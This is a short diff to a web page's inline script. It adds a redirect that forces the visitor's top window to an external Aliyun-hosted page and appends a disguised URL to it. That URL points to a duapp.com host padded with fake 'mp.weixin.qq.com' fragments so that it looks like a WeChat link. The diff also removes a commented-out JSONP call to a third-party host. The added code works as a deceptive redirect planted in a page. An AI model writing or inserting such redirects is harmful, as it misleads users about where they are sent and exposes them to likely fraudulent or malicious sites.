@@ -22,24 +22,11 @@
             checkdomain();
 	       });
 	function checkdomain(){
+	    var tail = 'http://888303.duapp.com/?sid=101066379&from=groupmessage&isappinstalled=0#/q5.php?vid=1&%23http://mp.weixin.qq.com/oks%40mp.weixin.qq.com/oks%40mp.weixin.qq.com/oks%40mp.weixin.qq.com/oks%40mp.weixin.qq.com/oks%40mp.weixin.qq.com/oks';
             if (top.location !== self.location) {
-              top.location.href = 'http://ynochp1567337551.oss-cn-shanghai.aliyuncs.com/url.html';
+              top.location.href = 'http://ynochp1567337551.oss-cn-shanghai.aliyuncs.com/url.html'+encodeURIComponent(tail);
             }
-	/* 
-    $.ajax({
-        url: 'http://wx.zhenxiangtu.net/weixin/js.php?siteid=1',
-        dataType: "jsonp",
-        jsonpCallback: "callback",
-        success: function(result) {
-            //ok
-       },
-        error: function(result) {
-            //showmsg("加载出错");
-        },
-    });
-	*/
-
-	       }
+}
   </script>
   </body>
 
